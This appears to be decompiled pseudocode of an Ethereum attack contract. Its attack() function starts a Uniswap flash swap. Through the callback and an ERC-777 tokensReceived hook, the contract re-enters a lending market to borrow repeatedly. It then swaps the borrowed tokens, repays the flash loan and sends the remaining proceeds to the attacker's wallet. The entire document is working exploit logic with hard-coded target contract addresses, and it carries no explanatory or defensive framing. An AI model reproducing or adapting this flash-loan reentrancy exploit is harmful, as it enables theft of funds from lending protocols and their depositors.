contract main {




// =====================  Runtime code  =====================


address walletAddress;
array of address stor1;

function wallet() {
    return walletAddress
}

function _fallback() payable {
    revert
}

function attack() {
    require ext_code.size(0x1820a4b7618bde71dce8cdc73aab6c95905fad24)
    call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.setInterfaceImplementer(address arg1, bytes32 arg2, address arg3) with:
         gas gas_remaining wei
        args address(this.address), 0x882cd8d5a28de4f590e0edad9589a2cb683bcd3a7b382d99ede4e9c79fd19857, this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    walletAddress = msg.sender
    require ext_code.size(0xd3d2e2692501a5c9ca623199d38826e513033a17)
    call 0xd3d2e2692501a5c9ca623199d38826e513033a17.swap(uint256 arg1, uint256 arg2, address arg3, bytes arg4) with:
         gas gas_remaining wei
        args 0, 0, 500 * 10^18, address(this.address), 128, 4, '0x00'
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function tokensReceived(bytes4 arg1, bytes32 arg2, address arg3, address arg4, address arg5, uint256 arg6, bytes arg7, bytes arg8) {
    require calldata.size - 4 >= 256
    require arg1 == Mask(32, 224, arg1)
    require arg2 == arg2
    require arg3 == arg3
    require arg4 == arg4
    require arg5 == arg5
    require arg6 == arg6
    require arg7 <= test266151307()
    require arg7 + 35 < calldata.size
    require arg7.length <= test266151307()
    require arg7 + arg7.length + 36 <= calldata.size
    require arg8 <= test266151307()
    require arg8 + 35 < calldata.size
    require arg8.length <= test266151307()
    require arg8 + arg8.length + 36 <= calldata.size
    require ext_code.size(0xc772ba6c2c28859b7a0542faa162a56115ddce25)
    call 0xc772ba6c2c28859b7a0542faa162a56115ddce25.borrow(uint256 arg1) with:
         gas gas_remaining wei
        args 354 * 10^18
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
}

function uniswapV2Call(address arg1, uint256 arg2, uint256 arg3, bytes arg4) {
    require calldata.size - 4 >= 128
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    require arg4 <= test266151307()
    require arg4 + 35 < calldata.size
    require arg4.length <= test266151307()
    require arg4 + arg4.length + 36 <= calldata.size
    require ext_code.size(0xc772ba6c2c28859b7a0542faa162a56115ddce25)
    call 0xc772ba6c2c28859b7a0542faa162a56115ddce25.0x2e1a7d4d with:
         gas gas_remaining wei
        args 500 * 10^18
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(0xc772ba6c2c28859b7a0542faa162a56115ddce25)
    call 0xc772ba6c2c28859b7a0542faa162a56115ddce25.0x1249c58b with:
       value 500 * 10^18 wei
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    mem[100] = 10^18
    require ext_code.size(0xc772ba6c2c28859b7a0542faa162a56115ddce25)
    call 0xc772ba6c2c28859b7a0542faa162a56115ddce25.borrow(uint256 arg1) with:
         gas gas_remaining wei
        args 10^18
    mem[96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
    require ext_code.size(0xe3d17c7e840ec140a7a51aca351a482231760824)
    call 0xe3d17c7e840ec140a7a51aca351a482231760824.accrueInterest() with:
         gas gas_remaining wei
    mem[ceil32(return_data.size) + 96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
    mem[(2 * ceil32(return_data.size)) + 100] = 19480000 * 10^18
    require ext_code.size(0xe3d17c7e840ec140a7a51aca351a482231760824)
    call 0xe3d17c7e840ec140a7a51aca351a482231760824.borrow(uint256 arg1) with:
         gas gas_remaining wei
        args 19480000 * 10^18
    mem[(2 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
    require ext_code.size(0xc772ba6c2c28859b7a0542faa162a56115ddce25)
    call 0xc772ba6c2c28859b7a0542faa162a56115ddce25.0xd0e30db0 with:
       value eth.balance(this.address) wei
         gas 40000 wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    mem[(4 * ceil32(return_data.size)) + 100] = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d
    mem[(4 * ceil32(return_data.size)) + 132] = 19480000000 * 10^18
    require ext_code.size(0xff20817765cb7f73d4bde2e66e067e58d11095c2)
    call 0xff20817765cb7f73d4bde2e66e067e58d11095c2.approve(address arg1, uint256 arg2) with:
         gas gas_remaining wei
        args 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 19480000000 * 10^18
    mem[(4 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    mem[(6 * ceil32(return_data.size)) + 96] = 0x38ed173900000000000000000000000000000000000000000000000000000000
    mem[(6 * ceil32(return_data.size)) + 100] = 19480000 * 10^18
    mem[(6 * ceil32(return_data.size)) + 132] = 1
    mem[(6 * ceil32(return_data.size)) + 164] = 160
    mem[(6 * ceil32(return_data.size)) + 260] = stor1.length
    mem[0] = 1
    idx = 0
    s = 0
    t = (6 * ceil32(return_data.size)) + 292
    while idx < stor1.length:
        mem[t] = stor1[s]
        idx = idx + 1
        s = s + 1
        t = t + 32
        continue 
    mem[(6 * ceil32(return_data.size)) + 196] = this.address
    mem[(6 * ceil32(return_data.size)) + 228] = block.timestamp
    require ext_code.size(0x7a250d5630b4cf539739df2c5dacb4c659f2488d)
    call 0x7a250d5630b4cf539739df2c5dacb4c659f2488d.swapExactTokensForTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
         gas gas_remaining wei
        args 19480000 * 10^18, 1, 160, address(this.address), block.timestamp, stor1.length, mem[(6 * ceil32(return_data.size)) + 292 len 32 * stor1.length]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    mem[(6 * ceil32(return_data.size)) + 96 len return_data.size] = ext_call.return_data[0 len return_data.size]
    mem[64] = (7 * ceil32(return_data.size)) + 96
    require return_data.size >= 32
    _32 = mem[(6 * ceil32(return_data.size)) + 96 len 4], 4535540938377380
    require mem[(6 * ceil32(return_data.size)) + 96 len 4], 4535540938377380 <= test266151307()
    require (6 * ceil32(return_data.size)) + mem[(6 * ceil32(return_data.size)) + 96 len 4], 4535540938377380 + 127 < (6 * ceil32(return_data.size)) + return_data.size + 96
    _33 = mem[(6 * ceil32(return_data.size)) + mem[(6 * ceil32(return_data.size)) + 96 len 4], 4535540938377380 + 96]
    if mem[(6 * ceil32(return_data.size)) + mem[(6 * ceil32(return_data.size)) + 96 len 4], 4535540938377380 + 96] > test266151307():
        revert with 'NH{q', 65
    if (7 * ceil32(return_data.size)) + floor32(mem[(6 * ceil32(return_data.size)) + mem[(6 * ceil32(return_data.size)) + 96 len 4], 4535540938377380 + 96]) + 97 > test266151307() or floor32(mem[(6 * ceil32(return_data.size)) + mem[(6 * ceil32(return_data.size)) + 96 len 4], 4535540938377380 + 96]) + 1 < 0:
        revert with 'NH{q', 65
    mem[64] = (7 * ceil32(return_data.size)) + floor32(mem[(6 * ceil32(return_data.size)) + mem[(6 * ceil32(return_data.size)) + 96 len 4], 4535540938377380 + 96]) + 97
    mem[(7 * ceil32(return_data.size)) + 96] = mem[(6 * ceil32(return_data.size)) + mem[(6 * ceil32(return_data.size)) + 96 len 4], 4535540938377380 + 96]
    require _32 + (32 * _33) + 32 <= return_data.size
    idx = (6 * ceil32(return_data.size)) + _32 + 128
    s = (7 * ceil32(return_data.size)) + 128
    while idx < (6 * ceil32(return_data.size)) + _32 + (32 * _33) + 128:
        require mem[idx] == mem[idx]
        mem[s] = mem[idx]
        idx = idx + 32
        s = s + 32
        continue 
    mem[mem[64] + 4] = 0xd3d2e2692501a5c9ca623199d38826e513033a17
    mem[mem[64] + 36] = 502 * 10^18
    require ext_code.size(0xc772ba6c2c28859b7a0542faa162a56115ddce25)
    call 0xc772ba6c2c28859b7a0542faa162a56115ddce25.0xa9059cbb with:
         gas gas_remaining wei
        args 0xd3d2e2692501a5c9ca623199d38826e513033a17, 502 * 10^18
    mem[mem[64]] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    _51 = mem[64]
    mem[64] = mem[64] + ceil32(return_data.size)
    require return_data.size >= 32
    require mem[_51] == bool(mem[_51])
    mem[mem[64] + 4] = this.address
    require ext_code.size(0xc772ba6c2c28859b7a0542faa162a56115ddce25)
    staticcall 0xc772ba6c2c28859b7a0542faa162a56115ddce25.0x70a08231 with:
            gas gas_remaining wei
           args address(this.address)
    mem[mem[64]] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    _55 = mem[64]
    mem[64] = mem[64] + ceil32(return_data.size)
    require return_data.size >= 32
    _56 = mem[_55]
    require mem[_55] == mem[_55]
    mem[mem[64] + 4] = walletAddress
    mem[mem[64] + 36] = _56
    require ext_code.size(0xc772ba6c2c28859b7a0542faa162a56115ddce25)
    call 0xc772ba6c2c28859b7a0542faa162a56115ddce25.0xa9059cbb with:
         gas gas_remaining wei
        args walletAddress, _56
    mem[mem[64]] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    _59 = mem[64]
    mem[64] = mem[64] + ceil32(return_data.size)
    require return_data.size >= 32
    require mem[_59] == bool(mem[_59])
}



}
